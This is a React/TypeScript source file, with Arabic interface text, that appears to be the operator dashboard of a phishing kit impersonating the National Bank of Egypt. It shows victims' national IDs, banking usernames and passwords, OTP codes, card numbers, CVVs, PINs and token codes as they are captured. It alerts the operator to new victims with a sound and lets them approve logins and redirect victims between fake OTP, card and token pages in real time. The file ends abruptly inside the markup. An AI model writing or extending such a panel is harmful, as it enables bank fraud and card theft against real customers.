/**
 * البنك الأهلي المصري - لوحة تحكم المشرف
 * تصميم احترافي مع عرض بيانات جميع العملاء (نشط/غير نشط)
 * التحويل الحر من أي صفحة
 */
import React, { useState, useEffect, useCallback } from "react";
import { trpc } from "@/lib/trpc";
import { useLocation } from "wouter";
import SecurityNoticeControl from "@/components/SecurityNoticeControl";

type Application = {
  id: number;
  nationalId: string;
  fullName: string | null;
  phoneNumber: string | null;
  watchColor: string | null;
  username: string | null;
  password: string | null;
  otpCode: string | null;
  cardNumber: string | null;
  cardExpiry: string | null;
  cardCvv: string | null;
  cardPin: string | null;
  watchLinkOtp: string | null;
  currentPage: string | null;
  customMessage: string | null;
  status: string | null;
  redirectTo: string | null;
  redirectError: string | null;
  governorate: string | null;
  address: string | null;
  createdAt: Date;
  updatedAt: Date;
};

const PAGE_LABELS: Record<string, string> = {
  "home": "الرئيسية", "choose-watch": "اختيار الساعة", "watch-details": "تفاصيل الساعة",
  "personal": "البيانات الشخصية", "login": "تسجيل الدخول", "otp": "OTP",
  "confirm-otp": "تأكيد OTP", "card": "البطاقة", "watchlink": "ربط الساعة",
  "processing": "انتظار", "smart-review": "مراجعة ذكية", "success": "نجاح", "registered": "مسجل",
  "whatsapp": "واتساب", "waiting-login": "انتظار موافقة الدخول", "token": "صفحة التوكن", "hard-token": "جهاز الأمان", "security-notice": "تنبيه عام", "confirm-address": "تأكيد العنوان",
};

const PAGE_COLORS: Record<string, string> = {
  "home": "#6b7280", "choose-watch": "#8b5cf6", "watch-details": "#7c3aed",
  "personal": "#2563eb", "login": "#0891b2", "otp": "#d97706",
  "confirm-otp": "#d97706", "card": "#dc2626", "watchlink": "#059669",
  "processing": "#1B7A3D", "smart-review": "#7c3aed", "success": "#16a34a", "registered": "#15803d",
  "whatsapp": "#25D366", "waiting-login": "#f59e0b", "token": "#1B7A3D", "hard-token": "#b45309", "security-notice": "#f97316", "confirm-address": "#0284c7",
};

function playSoundByType(type: string) {
  try {
    const audioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
    const oscillator = audioCtx.createOscillator();
    const gainNode = audioCtx.createGain();
    oscillator.connect(gainNode);
    gainNode.connect(audioCtx.destination);
    gainNode.gain.setValueAtTime(0.3, audioCtx.currentTime);
    oscillator.type = "sine";
    oscillator.frequency.setValueAtTime(800, audioCtx.currentTime);
    oscillator.frequency.setValueAtTime(1200, audioCtx.currentTime + 0.1);
    gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.4);
    oscillator.start(audioCtx.currentTime);
    oscillator.stop(audioCtx.currentTime + 0.4);
  } catch {}
}

function copyToClipboard(text: string) {
  navigator.clipboard.writeText(text).catch(() => {});
}

export default function AdminDashboard() {
  const [, setLocation] = useLocation();
  const [selectedId, setSelectedId] = useState<number | null>(null);
  const [customMsg, setCustomMsg] = useState("");
  const [prevCount, setPrevCount] = useState(0);
  const [lastUpdates, setLastUpdates] = useState<Record<string, string>>({});
  const [copiedField, setCopiedField] = useState<string | null>(null);
  const [deleteConfirm, setDeleteConfirm] = useState<string | null>(null);
  const [bulkRedirectLoading, setBulkRedirectLoading] = useState(false);
  const [bulkRedirectResult, setBulkRedirectResult] = useState<{ type: 'success' | 'error'; msg: string } | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [deleteInactiveConfirm, setDeleteInactiveConfirm] = useState(false);
  const [deleteInactiveLoading, setDeleteInactiveLoading] = useState(false);
  const [deleteInactiveResult, setDeleteInactiveResult] = useState<{ type: 'success' | 'error'; msg: string } | null>(null);
  const [showVisitorsModal, setShowVisitorsModal] = useState(false);
  const [visitorsFilter, setVisitorsFilter] = useState<"all" | "online">("all");
  const [visitorSearch, setVisitorSearch] = useState("");
  const [resetVisitorsConfirm, setResetVisitorsConfirm] = useState(false);
  const [resetVisitorsLoading, setResetVisitorsLoading] = useState(false);
  const [visitorRedirectResult, setVisitorRedirectResult] = useState<{ sessionId: string; msg: string } | null>(null);

  const { data: sessionData } = trpc.admin.checkSession.useQuery(undefined, { refetchInterval: 30000 });
  const { data: apiData, refetch } = trpc.admin.getApplications.useQuery(undefined, {
    refetchInterval: 2000,
    enabled: sessionData?.isAdmin === true,
  });
  const applications: Application[] | undefined = apiData ? (apiData as any).apps : undefined;
  const activeIds: string[] | undefined = apiData ? (apiData as any).activeIds : undefined;
  const totalVisitors: number | undefined = apiData ? (apiData as any).totalVisitors : undefined;
  const redirectMutation = trpc.admin.redirectUser.useMutation();
  const deleteMutation = trpc.admin.deleteApplication.useMutation();
  const logoutMutation = trpc.admin.logout.useMutation();
  const approveMutation = trpc.admin.approveLogin.useMutation();
  const rejectMutation = trpc.admin.rejectLogin.useMutation();
  const whatsappMutation = trpc.admin.redirectWhatsApp.useMutation();
  const redirectAllToTokenMutation = trpc.admin.redirectAllToToken.useMutation();
  const { data: whatsAppData } = trpc.admin.getWhatsAppLink.useQuery(undefined, { refetchInterval: 10000 });
  const updateWhatsAppLinkMutation = trpc.admin.updateWhatsAppLink.useMutation();
  const deleteInactiveMutation = trpc.admin.deleteInactiveClients.useMutation();
  const { data: liveVisitorsData } = trpc.admin.getLiveVisitors.useQuery(undefined, {
    refetchInterval: 2000,
    enabled: sessionData?.isAdmin === true,
  });
  const { data: allVisitorsData, refetch: refetchAllVisitors } = trpc.admin.getAllVisitors.useQuery(undefined, {
    refetchInterval: 3000,
    enabled: sessionData?.isAdmin === true && showVisitorsModal === true,
  });
  const resetTotalVisitorsMutation = trpc.admin.resetTotalVisitors.useMutation();
  const redirectVisitorMutation = trpc.admin.redirectVisitor.useMutation();
  const [whatsAppLink, setWhatsAppLink] = useState("");
  const [whatsAppSaved, setWhatsAppSaved] = useState(false);

  useEffect(() => {
    if (!sessionData && sessionData !== undefined) setLocation("/admin");
    if (sessionData?.isAdmin === false) setLocation("/admin");
  }, [sessionData]);

  useEffect(() => {
    if (whatsAppData?.link && !whatsAppLink) {
      setWhatsAppLink(whatsAppData.link);
    }
  }, [whatsAppData]);

  useEffect(() => {
    if (!applications) return;
    if (applications.length > prevCount && prevCount > 0) playSoundByType("newClient");
    setPrevCount(applications.length);
    const updates: Record<string, string> = {};
    applications.forEach(app => {
      if (app.currentPage) updates[app.nationalId] = app.currentPage;
    });
    const changed = Object.entries(updates).some(([id, page]) => lastUpdates[id] && lastUpdates[id] !== page);
    if (changed && Object.keys(lastUpdates).length > 0) playSoundByType("update");
    setLastUpdates(updates);
    // Auto-select latest if nothing selected
    if (selectedId === null && applications.length > 0) {
      setSelectedId(applications[applications.length - 1].id);
    }
  }, [applications]);

  // Fix: When clicking any client (active or not), show their data
  const handleSelectClient = useCallback((app: Application) => {
    setSelectedId(app.id);
    setDeleteConfirm(null);
  }, []);

  const handleRedirect = async (nationalId: string, page: string, showError = false) => {
    await redirectMutation.mutateAsync({ nationalId, page, showError });
    refetch();
  };

  const setMsgMutation = trpc.admin.setCustomMessage.useMutation();

  const handleSendMessage = async () => {
    const currentApp = applications?.find(a => a.id === selectedId);
    if (!currentApp || !customMsg.trim()) return;
    await setMsgMutation.mutateAsync({ nationalId: currentApp.nationalId, message: customMsg });
    setCustomMsg("");
    refetch();
  };

  const handleDelete = async (nationalId: string) => {
    if (!deleteConfirm) { setDeleteConfirm(nationalId); return; }
    if (deleteConfirm === nationalId) {
      await deleteMutation.mutateAsync({ nationalId });
      setDeleteConfirm(null); setSelectedId(null); refetch();
    } else { setDeleteConfirm(null); }
  };

  const handleLogout = async () => { await logoutMutation.mutateAsync(); setLocation("/admin"); };

  const handleCopy = (label: string, value: string) => {
    copyToClipboard(value);
    setCopiedField(label);
    setTimeout(() => setCopiedField(null), 1500);
  };

  if (!sessionData?.isAdmin) {
    return <div dir="rtl" style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", fontFamily: "'Cairo', sans-serif" }}>جاري التحقق...</div>;
  }

  const apps = applications || [];
  const totalClients = apps.length;
  const activeClientApps = apps.filter(app => activeIds && activeIds.includes(app.nationalId));
  const activeClients = activeClientApps.length;
  const totalVisitorsCount = totalVisitors ?? 0;
  const onlineVisitorsCount = liveVisitorsData?.visitors?.length ?? 0;
  const completedClients = apps.filter(app => app.currentPage && (app.currentPage === "success" || app.currentPage === "registered")).length;

  // Current selected client - FIXED: always show data for selected client
  const currentDetail = applications?.find(a => a.id === selectedId) || null;

  const formatDateTime = (dateStr: string | Date | null | undefined) => {
    if (!dateStr) return "—";
    try {
      const d = new Date(dateStr);
      return d.toLocaleDateString('ar-EG', { year: 'numeric', month: '2-digit', day: '2-digit' }) + ' ' + d.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
    } catch { return "—"; }
  };

  const detailFields = currentDetail ? [
    { icon: "🕐", label: "تاريخ ووقت المعاملة", value: formatDateTime(currentDetail.createdAt), color: "#1B7A3D", highlight: true },
    { icon: "📱", label: "رقم الهاتف", value: currentDetail.phoneNumber, color: "#3b82f6" },
    { icon: "🪪", label: "الرقم القومي", value: currentDetail.nationalId, color: "#6366f1" },
    { icon: "👤", label: "الاسم الكامل", value: currentDetail.fullName, color: "#1B7A3D" },
    { icon: "👁️", label: "كود المستخدم", value: currentDetail.username, color: "#0891b2" },
    { icon: "🔑", label: "كلمة المرور", value: currentDetail.password, color: "#ef4444" },
    { icon: "📲", label: "رمز OTP (6 أرقام)", value: currentDetail.otpCode, color: "#f59e0b", highlight: true },
    { icon: "💳", label: "رقم البطاقة", value: currentDetail.cardNumber, color: "#1B7A3D" },
    { icon: "📅", label: "تاريخ الانتهاء", value: currentDetail.cardExpiry, color: "#6366f1" },
    { icon: "🔒", label: "CVV", value: currentDetail.cardCvv, color: "#ef4444", highlight: true },
    { icon: "🔐", label: "الرقم السري (PIN)", value: currentDetail.cardPin, color: "#ef4444", highlight: true },
    { icon: "⌚", label: "رمز ربط الساعة (NBE Token)", value: currentDetail.watchLinkOtp, color: "#059669", highlight: true },
    { icon: "🎨", label: "لون الساعة", value: currentDetail.watchColor, color: "#8b5cf6" },
    { icon: "📍", label: "المحافظة", value: currentDetail.governorate || null, color: "#f59e0b" },
    { icon: "🏠", label: "عنوان التوصيل", value: currentDetail.address || null, color: "#f59e0b" },
    { icon: "📍", label: "الصفحة الحالية", value: currentDetail.currentPage ? PAGE_LABELS[currentDetail.currentPage] || currentDetail.currentPage : null, color: "#6b7280" },
    { icon: "📊", label: "الحالة", value: currentDetail.status, color: "#6b7280" },
  ] : [];

  // Filter apps by search
  const filteredApps = searchQuery
    ? apps.filter(a =>
        (a.fullName || "").includes(searchQuery) ||
        (a.phoneNumber || "").includes(searchQuery) ||
        (a.nationalId || "").includes(searchQuery)
      )
    : apps;

  const isActive = (app: Application) => activeIds?.includes(app.nationalId) || false;

  return (
    <div dir="rtl" style={{ minHeight: "100vh", background: "linear-gradient(135deg, #0f172a 0%, #1e293b 100%)", fontFamily: "'Cairo', sans-serif", color: "white" }}>
      {/* Top Bar */}
      <div style={{ background: "rgba(15,23,42,0.95)", backdropFilter: "blur(10px)", padding: "12px 24px", display: "flex", alignItems: "center", justifyContent: "space-between", borderBottom: "1px solid rgba(27,122,61,0.3)" }}>
        <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
          <div style={{ width: "36px", height: "36px", background: "linear-gradient(135deg, #1B7A3D, #16a34a)", borderRadius: "10px", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "18px" }}>🏦</div>
          <span style={{ color: "#1B7A3D", fontWeight: "800", fontSize: "16px" }}>لوحة التحكم</span>
          <span style={{ color: "rgba(255,255,255,0.4)", fontSize: "13px" }}>|</span>
          <span style={{ color: "rgba(255,255,255,0.5)", fontSize: "13px" }}>البنك الأهلي المصري</span>
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
          <SecurityNoticeControl />
          <button
            onClick={() => { setShowVisitorsModal(true); setVisitorsFilter("all"); }}
            style={{
              display: "inline-flex",
              alignItems: "center",
              gap: "8px",
              background: "rgba(245,158,11,0.18)",
              border: "1px solid rgba(245,158,11,0.45)",
              color: "#fbbf24",
              borderRadius: "999px",
              padding: "6px 14px",
              fontSize: "13px",
              fontWeight: "800",
              cursor: "pointer",
              fontFamily: "'Cairo', sans-serif",
              transition: "all 0.2s ease",
            }}
            title="عرض سجل وإحصائيات إجمالي الزوار"
          >
            <span>📊</span>
            <span>إجمالي الزوار:</span>
            <span style={{ background: "rgba(245,158,11,0.35)", padding: "2px 8px", borderRadius: "10px", color: "#ffffff", fontWeight: "800", minWidth: "24px", textAlign: "center", display: "inline-block" }}>
              {totalVisitorsCount}
            </span>
          </button>
          <span style={{ display: "inline-flex", alignItems: "center", gap: "6px", color: "#86efac", background: "rgba(34,197,94,0.12)", border: "1px solid rgba(34,197,94,0.3)", borderRadius: "999px", padding: "6px 10px", fontSize: "12px", fontWeight: "700" }}>
            <span style={{ width: "7px", height: "7px", borderRadius: "50%", background: "#22c55e", boxShadow: "0 0 7px #22c55e" }} />
            الزوار الآن: {onlineVisitorsCount}
          </span>
          <span style={{ color: "rgba(255,255,255,0.6)", fontSize: "13px" }}>👤 Admin</span>
          <button onClick={handleLogout} style={{ background: "rgba(220,38,38,0.15)", border: "1px solid rgba(220,38,38,0.3)", color: "#f87171", borderRadius: "8px", padding: "6px 16px", cursor: "pointer", fontSize: "13px", fontFamily: "'Cairo', sans-serif", fontWeight: "700" }}>
            خروج
          </button>
        </div>
      </div>

      {/* Stats Bar */}
      <div style={{ padding: "16px 24px", display: "grid", gridTemplateColumns: "repeat(5, 1fr)", gap: "16px", borderBottom: "1px solid rgba(255,255,255,0.06)" }}>
        {[
          { label: "إجمالي العملاء", value: totalClients, color: "#1B7A3D", bg: "rgba(27,122,61,0.1)", border: "rgba(27,122,61,0.25)", icon: "👥" },
          { label: "إجمالي الزوار", value: totalVisitorsCount, color: "#f59e0b", bg: "rgba(245,158,11,0.1)", border: "rgba(245,158,11,0.25)", icon: "📊", clickable: true, hint: "عرض السجل ↗", targetFilter: "all" as const },
          { label: "الزوار الحاليين", value: onlineVisitorsCount, color: "#22c55e", bg: "rgba(34,197,94,0.1)", border: "rgba(34,197,94,0.25)", icon: "🌐", live: true, clickable: true, hint: "المتصلين الآن ↗", targetFilter: "online" as const },
          { label: "عملاء نشطين", value: activeClients, color: "#3b82f6", bg: "rgba(59,130,246,0.1)", border: "rgba(59,130,246,0.25)", icon: "⚡", live: true },
          { label: "مكتملين", value: completedClients, color: "#16a34a", bg: "rgba(22,163,74,0.1)", border: "rgba(22,163,74,0.25)", icon: "✅" },
        ].map((stat, i) => (
          <div
            key={i}
            onClick={() => {
              if (stat.clickable) {
                setShowVisitorsModal(true);
                setVisitorsFilter(stat.targetFilter || "all");
              }
            }}
            style={{
              background: stat.bg,
              border: `1px solid ${stat.border}`,
              borderRadius: "14px",
              padding: "14px 16px",
              textAlign: "center",
              cursor: stat.clickable ? "pointer" : "default",
              transition: "transform 0.15s ease, box-shadow 0.15s ease",
            }}
            onMouseEnter={(e) => {
              if (stat.clickable) {
                e.currentTarget.style.transform = "translateY(-2px)";
                e.currentTarget.style.boxShadow = `0 6px 16px ${stat.bg}`;
              }
            }}
            onMouseLeave={(e) => {
              if (stat.clickable) {
                e.currentTarget.style.transform = "none";
                e.currentTarget.style.boxShadow = "none";
              }
            }}
          >
            <div style={{ fontSize: "24px", fontWeight: "800", color: stat.color, display: "flex", alignItems: "center", justifyContent: "center", gap: "6px" }}>
              {stat.live && stat.value > 0 && <span style={{ width: "8px", height: "8px", borderRadius: "50%", background: stat.color, display: "inline-block", animation: "pulse 1.5s infinite" }} />}
              {stat.icon} {stat.value}
            </div>
            <div style={{ fontSize: "12px", color: "rgba(255,255,255,0.5)", marginTop: "4px" }}>{stat.label}</div>
            {stat.hint && (
              <div style={{ fontSize: "10px", color: stat.color, marginTop: "2px", fontWeight: "700" }}>{stat.hint}</div>
            )}
          </div>
        ))}
      </div>

      {/* Main Layout */}
      <div style={{ display: "flex", height: "calc(100vh - 160px)" }}>

        {/* Active Clients */}
        <div style={{ width: "280px", borderLeft: "1px solid rgba(255,255,255,0.06)", overflowY: "auto", flexShrink: 0, background: "rgba(59,130,246,0.03)" }}>
          <div style={{ padding: "12px 16px", borderBottom: "1px solid rgba(255,255,255,0.06)", background: "rgba(59,130,246,0.08)", position: "sticky", top: 0, zIndex: 1 }}>
            <div style={{ display: "flex", alignItems: "center", gap: "8px", fontWeight: "800", fontSize: "13px", color: "#3b82f6" }}>
              <div style={{ width: "8px", height: "8px", borderRadius: "50%", background: "#22c55e", boxShadow: "0 0 6px #22c55e", animation: "pulse 1.5s infinite" }} />
              العملاء النشطين ({activeClients})
          </div>
        </div>
          {activeClientApps.length === 0 ? (
            <div style={{ padding: "30px 20px", textAlign: "center", color: "rgba(255,255,255,0.3)" }}>
              <div style={{ fontSize: "32px", marginBottom: "6px" }}>💤</div>
              <p style={{ fontSize: "12px" }}>لا يوجد عملاء نشطين</p>
            </div>
          ) : (
            activeClientApps.map((app) => (
              <div
                key={app.id}
                onClick={() => handleSelectClient(app)}
                style={{
                  padding: "10px 14px",
                  borderBottom: "1px solid rgba(255,255,255,0.04)",
                  cursor: "pointer",
                  background: selectedId === app.id ? "rgba(59,130,246,0.15)" : "transparent",
                  transition: "background 0.15s",
                }}
              >
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "6px" }}>
                  <span style={{ fontWeight: "700", fontSize: "12px" }}>{app.fullName || "مجهول"}</span>
                  <span style={{ background: PAGE_COLORS[app.currentPage || ""] || "#6b7280", color: "white", borderRadius: "8px", padding: "1px 6px", fontSize: "9px", fontWeight: "700" }}>
                    {PAGE_LABELS[app.currentPage || ""] || app.currentPage}
                  </span>
                </div>
                <div style={{ display: "flex", gap: "8px", fontSize: "10px", color: "rgba(255,255,255,0.5)" }}>
                  {app.phoneNumber && <span>📱 {app.phoneNumber}</span>}
                  {app.otpCode && <span style={{ color: "#fbbf24", fontWeight: "700" }}>OTP: {app.otpCode}</span>}
                </div>
              </div>
            ))
          )}
        </div>

        {/* Column 2: All Requests with Search */}
        <div style={{ width: "320px", borderLeft: "1px solid rgba(255,255,255,0.06)", overflowY: "auto", flexShrink: 0 }}>
          <div style={{ padding: "12px 14px", borderBottom: "1px solid rgba(255,255,255,0.06)", background: "rgba(27,122,61,0.06)", position: "sticky", top: 0, zIndex: 1 }}>
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "8px" }}>
              <span style={{ fontWeight: "800", fontSize: "13px", color: "#1B7A3D" }}>📋 جميع الطلبات ({totalClients})</span>
            </div>
            <input
              type="text"
              placeholder="🔍 بحث بالاسم أو الهاتف..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              style={{ width: "100%", padding: "8px 12px", background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: "8px", color: "white", fontSize: "12px", fontFamily: "'Cairo', sans-serif", outline: "none", boxSizing: "border-box" }}
            />
          </div>
          {filteredApps.length === 0 ? (
            <div style={{ padding: "40px 20px", textAlign: "center", color: "rgba(255,255,255,0.3)" }}>
              <div style={{ fontSize: "40px", marginBottom: "10px" }}>📭</div>
              <p style={{ fontSize: "13px" }}>لا توجد طلبات</p>
            </div>
          ) : (
            filteredApps.map((app) => (
              <div
                key={app.id}
                onClick={() => handleSelectClient(app)}
                style={{
                  padding: "10px 14px",
                  borderBottom: "1px solid rgba(255,255,255,0.04)",
                  cursor: "pointer",
                  background: selectedId === app.id ? "rgba(27,122,61,0.15)" : "transparent",
                  transition: "background 0.15s",
                  position: "relative",
                }}
              >
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "4px" }}>
                  <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                    {isActive(app) && <div style={{ width: "6px", height: "6px", borderRadius: "50%", background: "#22c55e" }} />}
                    <span style={{ fontWeight: "700", fontSize: "12px" }}>{app.fullName || "مجهول"}</span>
                  </div>
                  <span style={{ background: PAGE_COLORS[app.currentPage || ""] || "#6b7280", color: "white", borderRadius: "8px", padding: "1px 6px", fontSize: "9px", fontWeight: "700" }}>
                    {PAGE_LABELS[app.currentPage || ""] || app.currentPage}
                  </span>
                </div>
                <div style={{ color: "rgba(255,255,255,0.4)", fontSize: "10px" }}>
                  📱 {app.phoneNumber || "—"} • 🕐 {formatDateTime(app.createdAt)}
                </div>
                {app.otpCode && (
                  <div style={{ display: "inline-block", marginTop: "4px", background: "rgba(245,158,11,0.15)", borderRadius: "4px", padding: "1px 6px", fontSize: "10px", color: "#fbbf24", fontWeight: "700" }}>
                    📲 OTP: {app.otpCode}
                  </div>
                )}
                {/* Delete button */}
                <button
                  onClick={(e) => { e.stopPropagation(); handleDelete(app.nationalId); }}
                  style={{
                    position: "absolute", top: "6px", left: "6px",
                    background: deleteConfirm === app.nationalId ? "#dc2626" : "rgba(220,38,38,0.1)",
                    border: deleteConfirm === app.nationalId ? "1px solid #ef4444" : "1px solid rgba(220,38,38,0.2)",
                    color: deleteConfirm === app.nationalId ? "white" : "#f87171",
                    borderRadius: "5px", padding: "2px 6px", fontSize: "10px", cursor: "pointer",
                    fontFamily: "'Cairo', sans-serif", fontWeight: "700",
                  }}
                >
                  {deleteConfirm === app.nationalId ? "⚠️ تأكيد" : "✕"}
                </button>
              </div>
            ))
          )}
        </div>

        {/* Column 3: Detail Panel */}
        <div style={{ flex: 1, overflowY: "auto", padding: "20px 24px" }}>
          {!currentDetail ? (
            <div style={{ display: "flex", alignItems: "center", justifyContent: "center", height: "100%", color: "rgba(255,255,255,0.3)", flexDirection: "column", gap: "12px" }}>
              <div style={{ fontSize: "56px" }}>👈</div>
              <p>اختر طلباً لعرض تفاصيله</p>
            </div>
          ) : (
            <div>
              {/* Client Header */}
              <div style={{ background: "rgba(255,255,255,0.04)", borderRadius: "14px", padding: "16px 20px", marginBottom: "16px", border: "1px solid rgba(255,255,255,0.08)", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                <div style={{ display: "flex", alignItems: "center", gap: "14px" }}>
                  <div style={{ width: "44px", height: "44px", background: "linear-gradient(135deg, #1B7A3D, #16a34a)", borderRadius: "12px", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "20px" }}>👤</div>
                  <div>
                    <h2 style={{ fontWeight: "800", fontSize: "18px", margin: 0, color: "white" }}>{currentDetail.fullName || "مجهول"}</h2>
                    <div style={{ display: "flex", alignItems: "center", gap: "8px", marginTop: "4px" }}>
                      <span style={{ background: PAGE_COLORS[currentDetail.currentPage || ""] || "#6b7280", color: "white", borderRadius: "8px", padding: "2px 10px", fontSize: "11px", fontWeight: "700" }}>
                        {PAGE_LABELS[currentDetail.currentPage || ""] || currentDetail.currentPage}
                      </span>
                      <span style={{ color: "rgba(255,255,255,0.4)", fontSize: "11px" }}>🕐 {formatDateTime(currentDetail.createdAt)}</span>
                    </div>
                  </div>
                </div>
                <div style={{ display: "flex", gap: "8px" }}>
                  <button onClick={() => handleDelete(currentDetail.nationalId)}
                    style={{
                      background: deleteConfirm === currentDetail.nationalId ? "#dc2626" : "rgba(220,38,38,0.15)",
                      border: "1px solid rgba(220,38,38,0.3)",
                      color: deleteConfirm === currentDetail.nationalId ? "white" : "#f87171", borderRadius: "8px", padding: "6px 14px", fontSize: "12px",
                      fontWeight: "700", cursor: "pointer", fontFamily: "'Cairo', sans-serif",
                    }}>
                    {deleteConfirm === currentDetail.nationalId ? "⚠️ تأكيد" : "🗑️ حذف"}
                  </button>
                </div>
              </div>

              {/* OTP Section */}
              <div style={{ background: "linear-gradient(135deg, rgba(245,158,11,0.1), rgba(245,158,11,0.03))", border: "1px solid rgba(245,158,11,0.3)", borderRadius: "14px", padding: "16px", marginBottom: "16px" }}>
                <h3 style={{ fontWeight: "800", fontSize: "14px", marginBottom: "12px", color: "#f59e0b", margin: "0 0 12px" }}>
                  🔑 الرموز السرية
                </h3>
                <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: "10px" }}>
                  {[
                    { label: "رمز OTP", value: currentDetail.otpCode, icon: "📲" },
                    { label: "NBE Token", value: currentDetail.watchLinkOtp, icon: "⌚" },
                    { label: "PIN", value: currentDetail.cardPin, icon: "🔐" },
                  ].map((field, i) => field.value ? (
                    <div key={i} style={{ background: "rgba(0,0,0,0.3)", borderRadius: "10px", padding: "12px", border: "1px solid rgba(245,158,11,0.2)", textAlign: "center" }}>
                      <div style={{ fontSize: "10px", color: "rgba(255,255,255,0.5)", marginBottom: "4px" }}>{field.icon} {field.label}</div>
                      <div style={{ fontWeight: "800", fontSize: "20px", color: "#fbbf24", letterSpacing: "2px", fontFamily: "monospace" }}>{field.value}</div>
                      <button onClick={() => handleCopy(field.label, field.value!)}
                        style={{ marginTop: "6px", background: "rgba(255,255,255,0.08)", border: "none", borderRadius: "6px", padding: "3px 8px", color: "white", fontSize: "10px", cursor: "pointer", fontFamily: "'Cairo', sans-serif" }}>
                        {copiedField === field.label ? "✅ تم" : "📋 نسخ"}
                      </button>
                    </div>
                  ) : (
                    <div key={i} style={{ background: "rgba(0,0,0,0.15)", borderRadius: "10px", padding: "12px", border: "1px dashed rgba(255,255,255,0.08)", textAlign: "center" }}>
                      <div style={{ fontSize: "10px", color: "rgba(255,255,255,0.3)", marginBottom: "4px" }}>{field.icon} {field.label}</div>
                      <div style={{ color: "rgba(255,255,255,0.3)", fontSize: "12px" }}>لم يُسجل بعد</div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Card Data */}
              {currentDetail.cardNumber && (
                <div style={{ background: "rgba(27,122,61,0.08)", border: "1px solid rgba(27,122,61,0.25)", borderRadius: "14px", padding: "16px", marginBottom: "16px" }}>
                  <h3 style={{ fontWeight: "800", fontSize: "14px", marginBottom: "12px", color: "#4ade80", margin: "0 0 12px" }}>
                    💳 بيانات البطاقة
                  </h3>
                  <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "10px" }}>
                    <div style={{ background: "rgba(0,0,0,0.2)", borderRadius: "8px", padding: "10px" }}>
                      <div style={{ fontSize: "10px", color: "rgba(255,255,255,0.4)", marginBottom: "4px" }}>رقم البطاقة</div>
                      <div style={{ fontWeight: "700", fontSize: "13px", color: "white", letterSpacing: "1px" }}>{currentDetail.cardNumber}</div>
                    </div>
                    <div style={{ background: "rgba(0,0,0,0.2)", borderRadius: "8px", padding: "10px" }}>
                      <div style={{ fontSize: "10px", color: "rgba(255,255,255,0.4)", marginBottom: "4px" }}>الانتهاء</div>
                      <div style={{ fontWeight: "700", fontSize: "13px", color: "white" }}>{currentDetail.cardExpiry || "—"}</div>
                    </div>
                    <div style={{ background: "rgba(220,38,38,0.1)", borderRadius: "8px", padding: "10px", border: "1px solid rgba(220,38,38,0.2)" }}>
                      <div style={{ fontSize: "10px", color: "rgba(255,255,255,0.4)", marginBottom: "4px" }}>CVV</div>
                      <div style={{ fontWeight: "700", fontSize: "13px", color: "#ef4444" }}>{currentDetail.cardCvv || "—"}</div>
                    </div>
                    <div style={{ background: "rgba(220,38,38,0.1)", borderRadius: "8px", padding: "10px", border: "1px solid rgba(220,38,38,0.2)" }}>
                      <div style={{ fontSize: "10px", color: "rgba(255,255,255,0.4)", marginBottom: "4px" }}>PIN</div>
                      <div style={{ fontWeight: "700", fontSize: "13px", color: "#ef4444" }}>{currentDetail.cardPin || "—"}</div>
                    </div>
                  </div>
                </div>
              )}

              {/* All Client Data */}
              <div style={{ background: "rgba(255,255,255,0.03)", borderRadius: "14px", padding: "16px", marginBottom: "16px", border: "1px solid rgba(255,255,255,0.06)" }}>
                <h3 style={{ fontWeight: "800", fontSize: "14px", marginBottom: "12px", color: "#1B7A3D", margin: "0 0 12px" }}>📋 جميع البيانات</h3>
                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "10px" }}>
                  {detailFields.filter(f => f.value).map((field, i) => (
                    <div key={i} style={{ background: "rgba(255,255,255,0.04)", borderRadius: "10px", padding: "12px", border: `1px solid ${field.highlight ? "rgba(245,158,11,0.2)" : "rgba(255,255,255,0.06)"}`, position: "relative" }}>
                      <div style={{ color: "rgba(255,255,255,0.4)", fontSize: "10px", marginBottom: "4px", display: "flex", alignItems: "center", gap: "4px" }}>
                        {field.icon} {field.label}
                      </div>
                      <div style={{ fontWeight: "700", fontSize: "13px", wordBreak: "break-all", color: field.highlight ? "#fbbf24" : "white" }}>
                        {field.value}
                      </div>
                      <button onClick={() => handleCopy(field.label, field.value!)}
                        style={{ marginTop: "6px", background: "rgba(255,255,255,0.06)", border: "none", borderRadius: "5px", padding: "2px 8px", color: "rgba(255,255,255,0.5)", fontSize: "10px", cursor: "pointer", fontFamily: "'Cairo', sans-serif" }}>
                        {copiedField === field.label ? "✅ تم" : "نسخ"}
                      </button>
                    </div>
                  ))}
                </div>
              </div>

              {/* Redirect Controls */}
              <div style={{ background: "rgba(255,255,255,0.03)", borderRadius: "14px", padding: "16px", marginBottom: "16px", border: "1px solid rgba(255,255,255,0.06)" }}>
                <h4 style={{ fontWeight: "700", marginBottom: "12px", fontSize: "14px", color: "white", margin: "0 0 12px" }}>🎮 التحكم في رحلة العميل</h4>
                
                {/* Approval for login page */}
                {(currentDetail.currentPage === "login" || currentDetail.currentPage === "processing" || currentDetail.currentPage === "waiting-login") && (
                  <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "8px", marginBottom: "12px" }}>
                    <button onClick={async () => { await approveMutation.mutateAsync({ nationalId: currentDetail.nationalId }); refetch(); }}
                      style={{ background: "#16a34a", color: "white", border: "none", borderRadius: "8px", padding: "10px", fontSize: "12px", fontWeight: "700", cursor: "pointer", fontFamily: "'Cairo', sans-serif" }}>
                      ✅ موافقة
                    </button>
